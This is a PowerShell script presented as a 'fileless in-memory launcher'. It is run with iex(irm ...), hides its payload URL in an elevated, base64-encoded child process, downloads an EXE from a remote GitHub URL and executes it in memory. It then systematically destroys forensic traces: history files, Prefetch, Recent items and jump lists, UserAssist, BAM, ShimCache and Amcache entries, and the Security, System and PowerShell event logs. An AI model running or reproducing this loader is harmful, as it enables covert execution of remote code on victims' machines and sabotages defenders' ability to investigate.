# ════════════════════════════════════════════════════════════════
#  BEAMV2 — Fileless In-Memory Launcher (No disk write)
#  Usage: iex (irm 'https://gitlab.com/USER/REPO/-/raw/main/run.ps1')
# ════════════════════════════════════════════════════════════════

# ── ปิด history ทันที ──────────────────────────────────────────
try { Set-PSReadLineOption -HistorySaveStyle SaveNothing } catch {}
try { [Microsoft.PowerShell.PSConsoleReadLine]::ClearHistory() } catch {}
$null = Clear-History -ErrorAction SilentlyContinue
$histFile = "$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt"
try { [IO.File]::WriteAllText($histFile,'') } catch {}

# ════════════════════════════════════════════════════════════════
#  CONFIG — แก้แค่บรรทัดนี้
# ════════════════════════════════════════════════════════════════
$exeUrl = "https://github.com/phongsathornmp-tech/strike/raw/refs/heads/main/version.exe"
# ════════════════════════════════════════════════════════════════

# ── ตรวจ PARENT vs CHILD ───────────────────────────────────────
if ($env:BV2_CHILD -ne "1") {

    # encode URL + payload เป็น B64 ส่งให้ child
    $inner = @"
`$env:BV2_CHILD='1'
`$exeUrl='$exeUrl'
& ([scriptblock]::Create((irm '$($MyInvocation.MyCommand.Path -replace "'","''")')))
"@
    $b64 = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($inner))

    # spawn child PS Admin ด้วย -EncodedCommand (URL ไม่ปรากฏในใน cmdline)
    $psi = [Diagnostics.ProcessStartInfo]@{
        FileName        = "powershell.exe"
        Arguments       = "-NoProfile -NonInteractive -ExecutionPolicy Bypass -EncodedCommand $b64"
        Verb            = "runas"
        UseShellExecute = $true
    }
    try { [Diagnostics.Process]::Start($psi).WaitForExit() } catch {}

    # ล้าง parent history แล้วออก
    try { [IO.File]::WriteAllText($histFile,'') } catch {}
    try { Remove-Item $histFile -Force -ErrorAction SilentlyContinue } catch {}
    try { [Microsoft.PowerShell.PSConsoleReadLine]::ClearHistory() } catch {}
    $null = Clear-History -ErrorAction SilentlyContinue
    exit 0
}

# ════════════════════════════════════════════════════════════════
#  CHILD — โหลด EXE เข้า memory ตรงๆ ไม่แตะ disk
# ════════════════════════════════════════════════════════════════

try {
    # ดาวน์โหลด bytes เข้า RAM
    $wc = [Net.WebClient]::new()
    $wc.Headers["User-Agent"] = "Mozilla/5.0"
    [byte[]]$exeBytes = $wc.DownloadData($exeUrl)
    $wc.Dispose()

    # โหลดเข้า .NET runtime โดยตรง — ไม่มีไฟล์บน disk
    $asm = [Reflection.Assembly]::Load($exeBytes)

    # ล้าง bytes ใน memory หลัง load แล้ว
    for ($i = 0; $i -lt $exeBytes.Length; $i++) { $exeBytes[$i] = 0 }
    $exeBytes = $null
    [GC]::Collect()

    # หา EntryPoint แล้วรัน
    $entry = $asm.EntryPoint
    if ($entry) {
        $params = if ($entry.GetParameters().Count -gt 0) { ,@([string[]]@()) } else { @() }
        $entry.Invoke($null, $params)
    }
} catch {
    Write-Host "Load failed: $_" -ForegroundColor Red
    Start-Sleep 2
}

# ════════════════════════════════════════════════════════════════
#  WIPE ALL TRACES
# ════════════════════════════════════════════════════════════════

function _WRV([string]$p) {
    if (-not (Test-Path $p)) { return }
    try { (Get-Item $p -EA Stop).Property | ForEach-Object {
        Remove-ItemProperty -Path $p -Name $_ -Force -EA SilentlyContinue } } catch {}
}

# [1] history files
foreach ($h in @(
    "$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt",
    "$env:LOCALAPPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt"
)) {
    try {
        if (Test-Path $h) {
            $fs=[IO.File]::Open($h,'Open','Write')
            $z=[byte[]]::new($fs.Length); $fs.Write($z,0,$z.Length); $fs.Close()
            Remove-Item $h -Force -EA SilentlyContinue
        }
    } catch {}
}

# [2] Prefetch
$pf="$env:SystemRoot\Prefetch"
"POWERSHELL*","CMD*" | ForEach-Object {
    Get-ChildItem $pf -Filter $_ -EA SilentlyContinue | Remove-Item -Force -EA SilentlyContinue }

# [3] Recent + Jump Lists
Remove-Item "$([Environment]::GetFolderPath('Recent'))\*" -Force -Recurse -EA SilentlyContinue
Remove-Item "$env:APPDATA\Microsoft\Windows\Recent\AutomaticDestinations\*" -Force -EA SilentlyContinue
Remove-Item "$env:APPDATA\Microsoft\Windows\Recent\CustomDestinations\*"    -Force -EA SilentlyContinue

# [4] UserAssist
Get-ChildItem "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\UserAssist" -EA SilentlyContinue |
    ForEach-Object { _WRV "$($_.PSPath)\Count" }

# [5] MUI Cache
_WRV "HKCU:\Software\Classes\Local Settings\Software\Microsoft\Windows\Shell\MuiCache"

# [6] MRU
@("HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU",
  "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\TypedPaths",
  "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\ComDlg32\LastVisitedPidlMRU",
  "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\ComDlg32\OpenSavePidlMRU"
) | ForEach-Object { Remove-Item $_ -Recurse -Force -EA SilentlyContinue }

# [7] BAM
$bam="HKLM:\SYSTEM\CurrentControlSet\Services\bam\State\UserSettings"
if (Test-Path $bam) {
    Get-ChildItem $bam -EA SilentlyContinue | ForEach-Object {
        $n=$_.PSPath
        try { (Get-Item $n).Property | Where-Object {$_ -notmatch "^(Sequence|\(default\))$"} |
            ForEach-Object { Remove-ItemProperty -Path $n -Name $_ -Force -EA SilentlyContinue } } catch {}
    }
}

# [8] ShimCache
$shim="HKLM:\SYSTEM\CurrentControlSet\Control\Session Manager\AppCompatCache"
if (Test-Path $shim) { Remove-ItemProperty -Path $shim -Name "AppCompatCache" -Force -EA SilentlyContinue }

# [9] Amcache
$am="HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\AppCompatFlags\Amcache\InventoryApplicationFile"
if (Test-Path $am) {
    Get-ChildItem $am -EA SilentlyContinue | ForEach-Object {
        $lp=(Get-ItemProperty $_.PSPath -EA SilentlyContinue).LowerCaseLongPath
        if ($lp -match "powershell|version\.exe") {
            Remove-Item $_.PSPath -Recurse -Force -EA SilentlyContinue } } }

# [10] Event Logs
@("Security","System","Application",
  "Microsoft-Windows-PowerShell/Operational",
  "Microsoft-Windows-TaskScheduler/Operational",
  "Microsoft-Windows-Shell-Core/Operational"
) | ForEach-Object { try { wevtutil cl "$_" 2>$null } catch {} }
try { [Diagnostics.Eventing.Reader.EventLogSession]::GlobalSession.ClearLog(
    "Microsoft-Windows-PowerShell/Operational") } catch {}

# [11] env var cleanup
Remove-Item Env:BV2_CHILD -Force -EA SilentlyContinue

# [12] session memory final wipe
try { [Microsoft.PowerShell.PSConsoleReadLine]::ClearHistory() } catch {}
$null = Clear-History -EA SilentlyContinue
try { Set-PSReadLineOption -HistorySaveStyle SaveNothing } catch {}

[Console]::Clear()
